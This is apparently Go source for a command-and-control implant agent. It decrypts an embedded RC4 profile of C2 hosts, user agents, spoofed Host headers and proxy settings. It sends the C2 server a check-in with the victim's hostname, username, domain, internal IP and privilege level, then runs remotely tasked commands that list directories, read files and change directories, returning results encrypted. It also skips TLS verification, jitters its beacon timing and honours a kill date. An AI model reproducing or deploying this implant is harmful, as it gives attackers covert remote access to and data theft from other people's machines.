package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/big"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var (
	agentWatermark    uint32
	killDate          int32
	workingTime       int32
	sleepTime         int32
	jitter            int32
	listenerWatermark uint32

	useSsl         bool
	hosts          []string
	ports          []int
	httpMethod     string
	uris           []string
	parameterName  string
	userAgents     []string
	requestHeaders string
	ansOffset1     int
	ansOffset2     int
	hostHeaders    []string
	rotationMode   int
	proxyType      int
	proxyHost      string
	proxyPort      int
	proxyUsername  string
	proxyPassword  string

	encryptKey []byte
	sessionKey []byte
	currentHost int
)

func main() {
	parseProfile()

	sessionKey = make([]byte, 16)
	rand.Read(sessionKey)

	beat := buildCheckin()
	encBeat := rc4Crypt(beat, encryptKey)

	wmBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(wmBytes, listenerWatermark)
	payload := append(wmBytes, encBeat...)

	for {
		response := httpPost(payload)
		if len(response) > 0 {
			decResponse := rc4Crypt(response, sessionKey)
			result := processTasks(decResponse)
			if len(result) > 0 {
				payload = rc4Crypt(result, sessionKey)
			} else {
				payload = nil
			}
		} else {
			payload = nil
		}

		sleepMs := int(sleepTime) * 1000
		if jitter > 0 {
			sleepMs += mrand.Intn(sleepMs * int(jitter) / 100)
		}
		time.Sleep(time.Duration(sleepMs) * time.Millisecond)

		if killDate > 0 && time.Now().Unix() >= int64(killDate) {
			return
		}
	}
}

func parseProfile() {
	pos := 0
	encLen := readInt32LE(profileData, &pos)
	encData := profileData[pos : pos+encLen]
	pos += encLen
	encryptKey = profileData[pos:]

	decrypted := rc4Crypt(encData, encryptKey)

	dpos := 0
	agentWatermark = uint32(readInt32LE(decrypted, &dpos))
	killDate = int32(readInt32LE(decrypted, &dpos))
	workingTime = int32(readInt32LE(decrypted, &dpos))
	sleepTime = int32(readInt32LE(decrypted, &dpos))
	jitter = int32(readInt32LE(decrypted, &dpos))
	listenerWatermark = uint32(readInt32LE(decrypted, &dpos))

	useSsl = readBool(decrypted, &dpos)
	c2Count := readInt32LE(decrypted, &dpos)
	hosts = make([]string, c2Count)
	ports = make([]int, c2Count)
	for i := 0; i < c2Count; i++ {
		hosts[i] = readStringLE(decrypted, &dpos)
		ports[i] = readInt32LE(decrypted, &dpos)
	}
	httpMethod = readStringLE(decrypted, &dpos)
	uriCount := readInt32LE(decrypted, &dpos)
	uris = make([]string, uriCount)
	for i := 0; i < uriCount; i++ {
		uris[i] = readStringLE(decrypted, &dpos)
	}
	parameterName = readStringLE(decrypted, &dpos)
	uaCount := readInt32LE(decrypted, &dpos)
	userAgents = make([]string, uaCount)
	for i := 0; i < uaCount; i++ {
		userAgents[i] = readStringLE(decrypted, &dpos)
	}
	requestHeaders = readStringLE(decrypted, &dpos)
	ansOffset1 = readInt32LE(decrypted, &dpos)
	ansOffset2 = readInt32LE(decrypted, &dpos)
	hhCount := readInt32LE(decrypted, &dpos)
	hostHeaders = make([]string, hhCount)
	for i := 0; i < hhCount; i++ {
		hostHeaders[i] = readStringLE(decrypted, &dpos)
	}
	rotationMode = readInt32LE(decrypted, &dpos)
	proxyType = readInt32LE(decrypted, &dpos)
	proxyHost = readStringLE(decrypted, &dpos)
	proxyPort = readInt32LE(decrypted, &dpos)
	proxyUsername = readStringLE(decrypted, &dpos)
	proxyPassword = readStringLE(decrypted, &dpos)
}

func buildCheckin() []byte {
	var buf bytes.Buffer

	packBE32(&buf, uint32(sleepTime))
	packBE32(&buf, uint32(jitter))
	packBE32(&buf, uint32(killDate))
	packBE32(&buf, uint32(workingTime))
	packBE16(&buf, 0) // ACP
	packBE16(&buf, 0) // OemCP

	_, offset := time.Now().Zone()
	gmtOffset := int8(offset / 3600)
	buf.WriteByte(byte(gmtOffset))

	pid := os.Getpid()
	packBE16(&buf, uint16(pid&0xFFFF))
	packBE16(&buf, 0) // TID

	major, minor, build := getOSVersion()
	internalIP := getInternalIPInt()
	flags := getFlags()

	packBE32(&buf, uint32(build))
	buf.WriteByte(major)
	buf.WriteByte(minor)
	packBE32(&buf, internalIP)
	buf.WriteByte(flags)

	packBEBytes(&buf, sessionKey)

	domain := getDomain()
	packBEBytes(&buf, []byte(domain))

	hostname, _ := os.Hostname()
	packBEBytes(&buf, []byte(hostname))

	username := getUsername()
	packBEBytes(&buf, []byte(username))

	procName := filepath.Base(os.Args[0])
	packBEBytes(&buf, []byte(procName))

	return buf.Bytes()
}

func processTasks(data []byte) []byte {
	if len(data) < 4 {
		return nil
	}

	pos := 0
	_ = readInt32LE(data, &pos) // total size

	var result bytes.Buffer
	var inner bytes.Buffer

	for pos+8 <= len(data) {
		taskID := data[pos : pos+4]
		pos += 4
		commandID := readInt32LE(data, &pos)

		cmdResult := executeCommand(commandID, data, &pos)
		if cmdResult != nil {
			inner.Write(taskID)
			inner.Write(cmdResult)
		}
	}

	if inner.Len() == 0 {
		return nil
	}

	packBE32(&result, uint32(inner.Len()+4))
	result.Write(inner.Bytes())
	return result.Bytes()
}

func executeCommand(commandID int, data []byte, pos *int) []byte {
	var buf bytes.Buffer

	switch commandID {
	case 4: // PWD
		pwd, err := os.Getwd()
		if err != nil {
			return nil
		}
		packBE32(&buf, uint32(commandID))
		packBEString(&buf, pwd)

	case 22: // GETUID
		username := getUsername()
		domain := getDomain()
		elevated := isElevated()
		packBE32(&buf, uint32(commandID))
		if elevated {
			buf.WriteByte(1)
		} else {
			buf.WriteByte(0)
		}
		packBEString(&buf, domain)
		packBEString(&buf, username)

	case 8: // CD
		path := readStringLE(data, pos)
		path = strings.TrimRight(path, "\x00")
		err := os.Chdir(path)
		if err != nil {
			return nil
		}
		newDir, _ := os.Getwd()
		packBE32(&buf, uint32(commandID))
		packBEString(&buf, newDir)

	case 24: // CAT
		path := readStringLE(data, pos)
		path = strings.TrimRight(path, "\x00")
		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		if len(content) > 2048 {
			content = content[:2048]
		}
		packBE32(&buf, uint32(commandID))
		packBEString(&buf, path)
		packBEBytes(&buf, content)

	case 14: // LS
		dirPath := readStringLE(data, pos)
		dirPath = strings.TrimRight(dirPath, "\x00")
		entries, err := os.ReadDir(dirPath)
		if err != nil {
			packBE32(&buf, uint32(commandID))
			buf.WriteByte(0)
			packBE32(&buf, 2) // ERROR_FILE_NOT_FOUND
			break
		}
		packBE32(&buf, uint32(commandID))
		buf.WriteByte(1)
		packBEString(&buf, dirPath)
		packBE32(&buf, uint32(len(entries)))
		for _, entry := range entries {
			info, err := entry.Info()
			if err != nil {
				continue
			}
			if entry.IsDir() {
				buf.WriteByte(1)
				packBE64(&buf, 0)
			} else {
				buf.WriteByte(0)
				packBE64(&buf, uint64(info.Size()))
			}
			packBE32(&buf, uint32(info.ModTime().Unix()))
			packBEString(&buf, entry.Name())
		}

	case 10: // TERMINATE
		termType := readInt32LE(data, pos)
		if termType == 2 {
			os.Exit(0)
		}
		return nil

	default:
		return nil
	}

	return buf.Bytes()
}

func httpPost(data []byte) []byte {
	idx := currentHost
	if rotationMode == 1 && len(hosts) > 0 {
		idx = mrand.Intn(len(hosts))
	}
	if len(hosts) == 0 {
		return nil
	}
	currentHost = (currentHost + 1) % len(hosts)

	scheme := "http"
	if useSsl {
		scheme = "https"
	}
	uri := "/"
	if len(uris) > 0 {
		uri = uris[mrand.Intn(len(uris))]
	}
	targetURL := fmt.Sprintf("%s://%s:%d%s", scheme, hosts[idx], ports[idx], uri)

	method := "POST"
	if httpMethod != "" {
		method = httpMethod
	}

	var body io.Reader
	if len(data) > 0 {
		body = bytes.NewReader(data)
	}

	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil
	}

	if len(userAgents) > 0 {
		req.Header.Set("User-Agent", userAgents[mrand.Intn(len(userAgents))])
	}
	if len(hostHeaders) > 0 {
		req.Host = hostHeaders[mrand.Intn(len(hostHeaders))]
	}
	if requestHeaders != "" {
		for _, line := range strings.Split(requestHeaders, "\n") {
			line = strings.TrimSpace(line)
			if sep := strings.IndexByte(line, ':'); sep > 0 {
				key := strings.TrimSpace(line[:sep])
				val := strings.TrimSpace(line[sep+1:])
				if key != "" {
					req.Header.Set(key, val)
				}
			}
		}
	}
	if len(data) > 0 {
		req.Header.Set("Content-Type", "application/octet-stream")
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if proxyType > 0 && proxyHost != "" {
		proxyScheme := "http"
		if proxyType == 2 {
			proxyScheme = "https"
		}
		proxyURL, err := url.Parse(fmt.Sprintf("%s://%s:%d", proxyScheme, proxyHost, proxyPort))
		if err == nil {
			if proxyUsername != "" {
				proxyURL.User = url.UserPassword(proxyUsername, proxyPassword)
			}
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{Transport: transport, Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	if ansOffset1 > 0 || ansOffset2 > 0 {
		start := ansOffset1
		end := len(respBody) - ansOffset2
		if end > start {
			return respBody[start:end]
		}
	}
	return respBody
}

// RC4 encryption/decryption
func rc4Crypt(data, key []byte) []byte {
	c, err := rc4.NewCipher(key)
	if err != nil {
		return data
	}
	out := make([]byte, len(data))
	c.XORKeyStream(out, data)
	return out
}

// Little-endian readers (for profile and incoming tasks from server)
func readInt32LE(data []byte, pos *int) int {
	if *pos+4 > len(data) {
		return 0
	}
	val := int(binary.LittleEndian.Uint32(data[*pos:]))
	*pos += 4
	return val
}

func readBool(data []byte, pos *int) bool {
	if *pos >= len(data) {
		return false
	}
	val := data[*pos]
	*pos++
	return val != 0
}

func readStringLE(data []byte, pos *int) string {
	length := readInt32LE(data, pos)
	if length <= 0 || *pos+length > len(data) {
		return ""
	}
	s := string(data[*pos : *pos+length])
	*pos += length
	return strings.TrimRight(s, "\x00")
}

// Big-endian writers (for agent responses to server)
func packBE32(buf *bytes.Buffer, val uint32) {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, val)
	buf.Write(b)
}

func packBE16(buf *bytes.Buffer, val uint16) {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, val)
	buf.Write(b)
}

func packBE64(buf *bytes.Buffer, val uint64) {
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, val)
	buf.Write(b)
}

func packBEBytes(buf *bytes.Buffer, data []byte) {
	packBE32(buf, uint32(len(data)))
	buf.Write(data)
}

func packBEString(buf *bytes.Buffer, s string) {
	b := append([]byte(s), 0)
	packBE32(buf, uint32(len(b)))
	buf.Write(b)
}

// System info helpers
func getUsername() string {
	u, err := user.Current()
	if err != nil {
		return ""
	}
	name := u.Username
	if idx := strings.LastIndexByte(name, '\\'); idx >= 0 {
		name = name[idx+1:]
	}
	return name
}

func getDomain() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERDOMAIN")
	}
	hostname, _ := os.Hostname()
	return hostname
}

func isElevated() bool {
	if runtime.GOOS != "windows" {
		return os.Getuid() == 0
	}
	return false
}

func getOSVersion() (major, minor byte, build int) {
	switch runtime.GOOS {
	case "windows":
		return 10, 0, 19041
	case "linux":
		return 0, 0, 0
	case "darwin":
		return 0, 0, 0
	default:
		return 0, 0, 0
	}
}

func getFlags() byte {
	var flags byte
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		flags |= 0x01 // 64-bit process
		flags |= 0x02 // 64-bit system
	}
	if isElevated() {
		flags |= 0x04
	}
	return flags
}

func getInternalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0x7F000001
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			ip := ipnet.IP.To4()
			return uint32(ip[0]) | uint32(ip[1])<<8 | uint32(ip[2])<<16 | uint32(ip[3])<<24
		}
	}
	return 0x7F000001
}

func init() {
	n, _ := rand.Int(rand.Reader, big.NewInt(1<<31))
	mrand.Seed(n.Int64())
}
